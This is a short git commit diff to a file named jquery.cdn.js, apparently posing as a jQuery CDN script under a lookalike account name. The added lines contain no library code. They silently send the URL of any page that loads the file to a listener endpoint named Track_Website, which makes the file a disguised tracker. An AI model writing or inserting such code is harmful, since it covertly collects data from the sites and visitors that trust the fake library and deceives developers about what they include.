fbf83a2afb9d2d95602745b920e2d88921902628
bootstarpz <50875669+bootstarpz@users.noreply.github.com>
2023-01-19 02:03:42 +0600

    Update jquery.cdn.js

--- jquery.cdn.js
+++ jquery.cdn.js
@@ -1,1 +1,5 @@
-c
+    var websiteUrl = window.location.href;
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "http://localhost/hk/Track_Website/listener.php", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send("websiteUrl="+websiteUrl);
